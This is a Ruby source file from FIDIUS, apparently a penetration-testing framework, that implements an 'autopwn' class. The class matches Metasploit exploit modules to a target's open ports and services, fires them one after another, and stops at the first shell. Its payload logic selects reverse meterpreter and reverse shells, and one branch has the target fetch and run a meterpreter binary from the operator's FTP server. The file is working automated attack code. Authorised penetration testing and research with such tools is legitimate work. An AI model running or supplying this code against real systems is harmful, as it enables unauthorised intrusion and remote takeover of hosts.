require "fidius-common"
require 'timeout'

module FIDIUS
  module Action
    module Exploit
      
      # An instance of this class represents an autopwn against one host.
      class Autopwner
        attr_reader :exploits_to_try
        # timeout
        @@TIMEOUT = 30
        # some exploits need more than 30 sec
        # so they need a extended timeout
        @@EXTENDED_TIMEOUT = 120
        # exploits which need the extended time
        @@exploit_list = %w[exploit/unix/smtp/exim4_string_format]
        # broken exploits which have to be excluded. 
        @@exploit_blacklist = %w[mysql_yassl_getname]
        
        # Creates a autopwner object.
        # 
        # @param [Interface]  The interface to exploit.
        # @param [String]  The IP address the payload should reverse connect to.
        # @param [Integer]  The port the payload should reverse connect to.
        # @param [String] Time in seconds to wait between running an exploit.
        # @param [String] Time in seconds to wait between a used payload per exploit.
        def initialize rhost, lhost = nil, lport = nil, wait_after_exploit = nil, wait_after_payload = nil
          raise ArgumentError, "rhost must be of type Interface" unless rhost.is_a? FIDIUS::Asset::Interface
          @rhost = rhost
          @lhost = lhost
          @lport = lport
          @wait_after_exploit = wait_after_exploit
          @wait_after_payload = wait_after_payload
          @framework = FIDIUS::Action.msf_framework
          @progress_func = nil
          @exploits_to_try = 0
          @tried_exploits = 0
        end
        
        def register_progress_function &func
          @process_func = func
        end
        
        def exploit_done modname=""
          @tried_exploits += 1
          @process_func.call(@tried_exploits,modname) unless @process_func == nil
        end

        # Starts the exploitation process.
        #
        # @param [Hash] Hash with modules grouped by port
        # @param [Hash] Hash with modules grouped by service
        # @return [Msf::Session] A Session got for this exploit.
        def run_autopwn modules_by_port, modules_by_service
          modules = get_matching_modules_by_ports modules_by_port, modules_by_service
          unless @wait_after_exploit or @wait_after_payload
            modules = get_modules_ordered(modules)
          else
            modules = get_modules_ordered(modules,false)
          end
          @exploits_to_try = modules.count
          @tried_exploits = 0
          exploit_host_with_modules modules
        end
        
        # Runs an exploit against given +remote host port+ or +serivce+. If
        # +non_blocking+ is set to +true+ this method will return a thread
        # which has to be handled by caller. Otherwise the thread will be
        # joined after at least the amount of seconds which is set in
        # this class or if +timeout+ is given as parameter and not +nil+
        # the amount of seconds given by timeout parameter.
        #
        #
        # @param lhost Local host.
        # @param rhost Remote host.
        # @param rport Remote port.
        # @param rproto Protocol.
        # @param [String] modname Metasploits +module.fullname+
        # @param [Boolean] non_blocking +true+ if the exploit should run in
        #                  a new thread.
        # @param [Integer] timeout A timeout.
        # @return [Thread] If +non_blocking+ is set to +true+, this method
        #                  may return a running thread (which might be
        #                  already finished at the point of return). Otherwise,
        #                  after either the given +timeout+ or a local
        #                  +@@TIMEOUT+, a finished thread is returned.
        def run_exploit_against_host_at_port mod_name, rport, rproto, non_blocking = false, timeout = nil
          opts = {}
          opts['RHOST'] = @rhost.ip
          if (rport)
            opts['RPORT'] = rport.to_s
          end
          opts['LHOST'] = @lhost ? @lhost : (FIDIUS::Common.get_my_ip @rhost.ip)
          opts['LPORT'] = @lport ? @lport : (rand(0x8fff) + 4000).to_s
          if (opts['LHOST'] == '127.0.0.1')
            puts("Failed to determine listener address for target #{rhost}...")
            return
          end
          # TODO: win / linux 64bit und ipv6 support
          unless @wait_after_exploit or @wait_after_payload
            @framework.modules[mod_name.sub('exploit/','')].new.compatible_payloads.flatten.each do |xpl|
              if xpl.class == String and xpl.include? "meterpreter"
                @meterpreter = true
              end
            end
            if @meterpreter
              if(mod_name =~ /\/windows\//)
                if @framework.modules[mod_name.sub('exploit/','')].new.arch.include? "php"
                  opts['PAYLOAD'] = 'php/meterpreter/reverse_tcp'
                elsif @framework.modules[mod_name.sub('exploit/','')].new.arch.include? "java"
                  opts['PAYLOAD'] = 'java/meterpreter/reverse_tcp' 
                else
                  opts['PAYLOAD'] = 'windows/meterpreter/reverse_tcp'
                end
              elsif(mod_name =~ /\/linux\// or mod_name =~ /\/unix\//)
                if @framework.modules[mod_name.sub('exploit/','')].new.arch.include? "php"
                  opts['PAYLOAD'] = 'php/meterpreter/reverse_tcp'
                elsif @framework.modules[mod_name.sub('exploit/','')].new.arch.include? "java"
                  opts['PAYLOAD'] = 'java/meterpreter/reverse_tcp' 
                else
                  opts['PAYLOAD'] = 'linux/x86/meterpreter/reverse_tcp'
                end
              end
            else
              if @framework.modules[mod_name.sub('exploit/','')].new.arch.include? "cmd"
                if(mod_name =~ /\/linux\// or mod_name =~ /\/unix\//)
                  dl_payload = 'linux/x86/meterpreter/reverse_tcp'
                  ip = FIDIUS::Common.get_my_ip(@rhost.ip)
                  opts['PAYLOAD'] = 'cmd/unix/download_exec_wget'
                  opts['URL'] = "ftp://#{ip}:13000/#{dl_payload.gsub('/','_')}"
                end
              else
                opts['PAYLOAD'] = 'generic/shell_reverse_tcp'
              end
            end
            begin
              time = Time.now.to_f
              if @@exploit_list.include? mod_name
                timeout = @@EXTENDED_TIMEOUT
              else
                timeout = @@TIMEOUT
              end
              Timeout::timeout(timeout) do
                if(mod_name =~ /exploit\//)
                  puts "Running exploit #{mod_name} with opts #{opts}" 
                  return FIDIUS::Action::Msf.instance.run_exploit(mod_name, opts, false)
                elsif(mod_name =~ /auxiliary\//)
                  puts "Running auxiliary #{mod_name} with opts #{opts}"
                  return FIDIUS::Action::Msf.instance.run_auxiliary(mod_name, opts, false)
                else
                  raise "unkown type of exploit #{mod_name}"
                end
              end
            rescue Timeout::Error
              puts("timeout from #{mod_name} after #{Time.now.to_f - time} seconds")
            rescue Exception
              puts("exception during launch from #{mod_name}: #{$!} ")
            end
          else
            sleep @wait_after_exploit.to_f
            puts "[*] Waiting for #{@wait_after_exploit} seconds before next exploit."
            @framework.modules[mod_name.sub('exploit/','')].new.compatible_payloads.each do |xpl|
              opts['PAYLOAD'] = xpl[0]
              begin 
                Timeout::timeout(timeout) do
                  FIDIUS::Action::Msf.instance.run_exploit(mod_name, opts, false)
                  sleep @wait_after_payload.to_f
                  puts "[*] Waiting for #{@wait_after_payload} seconds before next payload: Exploit => #{mod_name} and Payload => #{xpl[0]}"
                end
              rescue Timeout::Error
                puts("timeout from #{mod_name} after #{Time.now.to_f - time} seconds")
              rescue Exception
                puts("exception during launch from #{mod_name}: #{$!} ")
              end
            end
          end
        end
private
       
        def order_by_date modules
          return modules.sort do |a, b|
            date_of_a = a[1][:disclosure] ? a[1][:disclosure].to_s : Date.parse("01.01.1970").to_s
            date_of_b = b[1][:disclosure] ? b[1][:disclosure].to_s : Date.parse("01.01.1970").to_s
            if date_of_a == date_of_b then 0 elsif date_of_a <= date_of_b then 1 else -1 end
          end
        end
        
        # Orders modules_by_port modules of each host by disclosure date, respecting the
        # initially given +stealthiness+ level.
        # 
        # @param [Array?] A list of modules, sorted by port.
        # @return [Array?] The sorted list.
        def get_modules_ordered modules, remove_not_matching = true
          modules = order_by_date modules
          if remove_not_matching && @rhost.host.os_name
            exclude_osnames = []
            rhost_name = @rhost.host.os_name.downcase
            if rhost_name == "windows"
              exclude_osnames = ["linux", "unix", "osx"]
            elsif rhost_name == "osx" or rhost_name == "linux"
              exclude_osnames = ["windows"]
            end
            modules = modules.select { |s| 
              !exclude_osnames.include?(s[1][:platform].downcase) or s[1][:platform].size == 0
            }
          end
          modules
        end

        def get_matching_modules_by_ports modules_by_port, modules_by_service
          matches = {}
          @rhost.services.each do |serv|
            puts serv.interface
            next unless serv.interface
            # next if (serv.state != Msf::ServiceState::Open)
            xhost = @rhost.ip
            xport = serv.port.to_i
            xprot = serv.proto
            xname = serv.name
            next if xport == 0
            mods = modules_by_port[xport] || {}
            mods.each_key do |modname|
              opts = {}
              opts['RPORT'] = xport
              opts['RHOST'] = xhost
              matches[modname] ||= {}
              matches[modname] = matches[modname].merge(mods[modname])
              matches[modname] = matches[modname].merge({:xport => xport, :xprot => xprot, :opts => opts})
            end

            mods = modules_by_service[xname] || {}
            mods.each_key do |modname|
              opts = {}
              opts['RPORT'] = xport
              opts['RHOST'] = xhost
              matches[modname] ||= {}
              matches[modname] = matches[modname].merge(mods[modname])
              matches[modname] = matches[modname].merge({:xport => xport, :xprot => xprot, :opts => opts})
            end
          end
          matches
        end

        # The original description of this method was:
        #
        #   host_list: hashmap[<host>][module instance][[<remote port>, <remote protocol>]]
        #   mod_order: hashmap[<host>] => Array of keys (module instance is used as keys)
        #
        # but I do not understand it...
        #
        # @param [Hash] host_list ?
        # @param [Hash] mod_order ?
        # @return [void]
        def exploit_host_with_modules mod_order
          mod_order.each do |modname, opts|
            puts "begin to exploit"
            next if (@@exploit_blacklist.include? modname.split('/').last)
            session = run_exploit_against_host_at_port modname, opts[:xport], opts[:xprot]
            exploit_done(modname)
            unless @wait_after_exploit or @wait_after_payload
              if session
                return session
              end
            end
          end
        end
      end # class Exploit
    end # module Exploit
  end # module Action
end # module FIDIUS

